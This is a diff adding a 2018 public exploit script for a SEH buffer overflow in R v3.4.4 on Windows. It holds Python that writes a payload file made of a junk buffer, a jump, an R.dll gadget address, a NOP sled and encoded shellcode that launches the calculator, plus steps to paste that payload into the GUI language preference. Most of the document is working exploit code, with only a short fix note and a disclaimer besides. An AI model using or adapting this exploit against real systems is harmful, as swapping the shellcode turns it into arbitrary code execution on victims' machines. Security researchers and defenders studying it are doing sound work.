@@ -1,0 +1,73 @@
+#--------------------------------------------------------#
+#Exploit Title: R v3.4.4 - (SEH) Buffer Overflow Exploit
+#Exploit Author : ZwX
+#Exploit Date: 2018-08-22
+#Vendor Homepage : https://www.r-project.org/
+#Tested on OS: Windows 7
+#Social: twitter.com/ZwX2a
+#contact: msk4@live.fr
+#Website: http://zwx-pentester.fr/
+#--------------------------------------------------------#
+
+
+#Technical Details & Description:
+#================================
+'''A local buffer overflow vulnerability has been discovered in the official R v3.4.4 software.
+The vulnerability allows local attackers to overwrite the registers (example eip) to compromise the local software process.
+The issue can be exploited by local attackers with system privileges to compromise the affected local computer system.
+The vulnerability is marked as classic buffer overflow issue'''
+
+
+# Manual steps to reproduce the vulnerability: under GUI preferences
+# paste bo.txt contents into 'Language for menus and messages' click ok --> Now the calculator executes!
+
+
+#!/usr/bin/python
+
+from struct import pack
+buffer = "x41" * 900
+a = "\xeb\x14\x90\x90"
+b = pack("<I",0x6cb85492)  #pop esi # pop ebp # ret 04 |  {PAGE_EXECUTE_READ} [R.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.4.4 (C:Program FilesRR-3.4.4bini386R.dll)
+calc=("\xdb\xd7\xd9\x74\x24\xf4\xb8\x79\xc4\x64\xb7\x33\xc9\xb1\x38"
+"\x5d\x83\xc5\x04\x31\x45\x13\x03\x3c\xd7\x86\x42\x42\x3f\xcf"
+"\xad\xba\xc0\xb0\x24\x5f\xf1\xe2\x53\x14\xa0\x32\x17\x78\x49"
+"\xb8\x75\x68\xda\xcc\x51\x9f\x6b\x7a\x84\xae\x6c\x4a\x08\x7c"
+"\xae\xcc\xf4\x7e\xe3\x2e\xc4\xb1\xf6\x2f\x01\xaf\xf9\x62\xda"
+"\xa4\xa8\x92\x6f\xf8\x70\x92\xbf\x77\xc8\xec\xba\x47\xbd\x46"
+"\xc4\x97\x6e\xdc\x8e\x0f\x04\xba\x2e\x2e\xc9\xd8\x13\x79\x66"
+"\x2a\xe7\x78\xae\x62\x08\x4b\x8e\x29\x37\x64\x03\x33\x7f\x42"
+"\xfc\x46\x8b\xb1\x81\x50\x48\xc8\x5d\xd4\x4d\x6a\x15\x4e\xb6"
+"\x8b\xfa\x09\x3d\x87\xb7\x5e\x19\x8b\x46\xb2\x11\xb7\xc3\x35"
+"\xf6\x3e\x97\x11\xd2\x1b\x43\x3b\x43\xc1\x22\x44\x93\xad\x9b"
+"\xe0\xdf\x5f\xcf\x93\xbd\x35\x0e\x11\xb8\x70\x10\x29\xc3\xd2"
+"\x79\x18\x48\xbd\xfe\xa5\x9b\xfa\xf1\xef\x86\xaa\x99\xa9\x52"
+"\xef\xc7\x49\x89\x33\xfe\xc9\x38\xcb\x05\xd1\x48\xce\x42\x55"
+"\xa0\xa2\xdb\x30\xc6\x11\xdb\x10\xa5\xaf\x7f\xcc\x43\xa1\x1b"
+"\x9d\xe4\x4e\xb8\x32\x72\xc3\x34\xd0\xe9\x10\x87\x46\x91\x37"
+"\x8b\x15\x7b\xd2\x2b\xbf\x83")
+nops = "\x90" * 20
+
+poc = buffer + a + b + nops + calc
+file = open("bo.txt","w")
+file.write(poc)
+file.close()
+
+print "POC Created by ZwX"
+
+
+#Solution - Fix & Patch:
+#=======================
+'''The solution could be to restrict and filter the number of characters on input of 'Language for menus and messages' '''
+
+
+# Disclaimer:
+#===============
+
+'''Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the
+author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related
+information or exploits by the author or elsewhere.
+
+
+
+                                    Copyright A(c) 2018 | ZwX - Security Researcher (Software & web application)'''
